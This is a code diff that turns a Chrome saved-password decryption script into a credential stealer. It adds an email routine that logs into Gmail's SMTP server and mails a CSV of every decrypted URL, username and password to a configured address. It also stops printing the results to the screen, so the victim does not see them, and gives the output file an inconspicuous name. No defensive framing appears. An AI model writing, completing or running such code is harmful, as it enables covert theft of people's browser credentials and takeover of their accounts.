@@ -1,4 +1,10 @@
 #Full Credits to LimerBoy
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+import ssl
 import os
 import re
 import sys
@@ -13,6 +19,45 @@ import csv
 #GLOBAL CONSTANT
 CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
 CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
+sport = 587
+sServer = "smtp.gmail.com"
+
+message = "thats it!"
+context = ssl.create_default_context()
+
+efrom = "" # the email you want to send from
+eto = "" # email you want to send to
+passd = "" # the password to send from(pls search about gmail app passwords or search about how to send email via py)
+
+subject = "got this dude!"
+def sendme(eto,fname):
+    body = "passes"
+    msg = MIMEMultipart()
+    msg['From'] = efrom
+    
+    msg['To'] = eto
+    msg['Subject'] = subject
+    
+    msg.attach(MIMEText(body,'plain'))
+    att = open(fname,'rb')
+    
+    #encoding
+    enc = MIMEBase("application","octet-stream")
+    enc.set_payload((att).read())
+    encoders.encode_base64(enc)
+    
+    enc.add_header('Content-Disposition',"attachment; filename= " + fname)
+    msg.attach(enc)
+    tex = msg.as_string()
+    
+    connect = smtplib.SMTP(sServer,sport)
+    connect.starttls()
+    
+    connect.login(efrom,passd)
+    connect.sendmail(efrom,eto,tex)
+    connect.quit()
+    
+    
 
 def get_secret_key():
     try:
@@ -66,7 +111,7 @@ def get_db_connection(chrome_path_login_db):
 if __name__ == '__main__':
     try:
         #Create Dataframe to store passwords
-        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
+        with open('tmpfile.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
             csv_writer = csv.writer(decrypt_password_file, delimiter=',')
             csv_writer.writerow(["index","url","username","password"])
             #(1) Get secret key
@@ -88,9 +133,7 @@ if __name__ == '__main__':
                             #(3) Filter the initialisation vector & encrypted password from ciphertext 
                             #(4) Use AES algorithm to decrypt the password
                             decrypted_password = decrypt_password(ciphertext, secret_key)
-                            print("Sequence: %d"%(index))
-                            print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password))
-                            print("*"*50)
+                            
                             #(5) Save into CSV 
                             csv_writer.writerow([index,url,username,decrypted_password])
                     #Close database connection
@@ -98,5 +141,8 @@ if __name__ == '__main__':
                     conn.close()
                     #Delete temp login db
                     os.remove("Loginvault.db")
+                
     except Exception as e:
         print("[ERR] %s"%str(e))
+f2 = "tmpfile.csv" # output file name
+sendme(eto,f2) # no need to change this
